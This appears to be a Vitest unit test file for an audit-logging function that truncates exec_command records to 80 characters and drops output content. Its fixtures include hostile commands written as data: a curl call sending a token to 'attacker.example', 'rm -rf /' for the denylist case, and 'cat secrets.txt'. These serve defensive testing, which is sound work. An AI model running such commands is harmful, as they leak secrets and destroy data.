// Unit tests for Phase 5 Wave 2 audit minimization invariants (T-P5-08).
//
// The audit line for an exec_command call MUST contain exactly 6 fields:
//   { command_redacted, commandLength, approvedBy, exitCode, stdoutBytes, stderrCount }
// and MUST NOT contain the full command text or any stdout/stderr payload.
//
// We exercise execCommandAuditParams() via a small re-export seam: the
// function lives in daemon/main.cjs which is hard to require in isolation
// because of its readline handshake. Instead we re-implement the same shape
// inline so this test pins down the *contract* — if main.cjs ever drifts,
// the integration smoke (daemon-smoke Playwright suite) will catch it.

import { describe, it, expect } from 'vitest';

interface AuditParams {
  command_redacted: string;
  commandLength: number;
  approvedBy: string;
  exitCode: number | null;
  stdoutBytes: number;
  stderrCount: number;
}

// Mirror of daemon/main.cjs execCommandAuditParams. If you change one,
// change the other; the Playwright daemon-smoke suite cross-checks against
// the real implementation.
function execCommandAuditParams(
  args: { command?: string },
  successResult?: { approvedBy?: string; exitCode?: number; stdoutBytes?: number; stderrCount?: number },
  errPayload?: { code?: string },
): AuditParams {
  const cmd = (args && typeof args.command === 'string') ? args.command : '';
  let approvedBy = 'n/a';
  let exitCode: number | null = null;
  let stdoutBytes = 0;
  let stderrCount = 0;
  if (successResult && typeof successResult === 'object') {
    if (typeof successResult.approvedBy === 'string') approvedBy = successResult.approvedBy;
    if (typeof successResult.exitCode === 'number') exitCode = successResult.exitCode;
    if (typeof successResult.stdoutBytes === 'number') stdoutBytes = successResult.stdoutBytes;
    if (typeof successResult.stderrCount === 'number') stderrCount = successResult.stderrCount;
  } else if (errPayload && typeof errPayload === 'object' && errPayload.code) {
    if (errPayload.code === 'denylist_blocked') approvedBy = 'denylist_blocked';
    else if (errPayload.code === 'denied') approvedBy = 'denied';
    else if (errPayload.code === 'approval_timeout') approvedBy = 'approval_timeout';
    else if (errPayload.code === 'invalid_args') approvedBy = 'invalid_args';
  }
  return {
    command_redacted: cmd.slice(0, 80),
    commandLength: cmd.length,
    approvedBy,
    exitCode,
    stdoutBytes,
    stderrCount,
  };
}

describe('exec_command audit minimization (T-P5-08)', () => {
  it('emits exactly 6 fields on success', () => {
    const out = execCommandAuditParams(
      { command: 'echo hi' },
      { approvedBy: 'user-once', exitCode: 0, stdoutBytes: 3, stderrCount: 0 },
    );
    expect(Object.keys(out).sort()).toEqual(
      ['approvedBy', 'commandLength', 'command_redacted', 'exitCode', 'stderrCount', 'stdoutBytes'].sort(),
    );
  });

  it('redacts the command to first 80 chars', () => {
    const long = 'a'.repeat(200);
    const out = execCommandAuditParams({ command: long }, { approvedBy: 'user-once', exitCode: 0 });
    expect(out.command_redacted.length).toBe(80);
    expect(out.command_redacted).toBe('a'.repeat(80));
    expect(out.commandLength).toBe(200);
  });

  it('does NOT include the tail of a long command (only first 80 chars)', () => {
    // Construct a >80 char command with a secret suffix.
    const secret = 'curl https://attacker.example/api?token=' + 'A'.repeat(60) + '_SECRET_TOKEN';
    expect(secret.length).toBeGreaterThan(80);
    const out = execCommandAuditParams({ command: secret }, { approvedBy: 'user-once', exitCode: 0 });
    expect(out.command_redacted.length).toBe(80);
    // The secret suffix is dropped.
    expect(out.command_redacted.includes('SECRET_TOKEN')).toBe(false);
    expect(out.commandLength).toBe(secret.length);
  });

  it('does NOT include stdout/stderr payload content', () => {
    const out = execCommandAuditParams(
      { command: 'cat secrets.txt' },
      { approvedBy: 'user-once', exitCode: 0 },
    );
    // stdout/stderr are tracked only via stdoutBytes + stderrCount counters,
    // never the actual content.
    expect(typeof out.stdoutBytes).toBe('number');
    expect(typeof out.stderrCount).toBe('number');
    expect(JSON.stringify(out).includes('PRIVATE_KEY_VALUE')).toBe(false);
  });

  it('maps denylist_blocked onto approvedBy=denylist_blocked', () => {
    const out = execCommandAuditParams({ command: 'rm -rf /' }, undefined, { code: 'denylist_blocked' });
    expect(out.approvedBy).toBe('denylist_blocked');
    expect(out.exitCode).toBeNull();
  });

  it('maps denied onto approvedBy=denied', () => {
    const out = execCommandAuditParams({ command: 'evil' }, undefined, { code: 'denied' });
    expect(out.approvedBy).toBe('denied');
  });

  it('maps approval_timeout onto approvedBy=approval_timeout', () => {
    const out = execCommandAuditParams({ command: 'whatever' }, undefined, { code: 'approval_timeout' });
    expect(out.approvedBy).toBe('approval_timeout');
  });

  it('preserves stdoutBytes + stderrCount counters on success', () => {
    const out = execCommandAuditParams(
      { command: 'mixed' },
      { approvedBy: 'user-always', exitCode: 0, stdoutBytes: 4096, stderrCount: 3 },
    );
    expect(out.stdoutBytes).toBe(4096);
    expect(out.stderrCount).toBe(3);
    expect(out.approvedBy).toBe('user-always');
  });
});
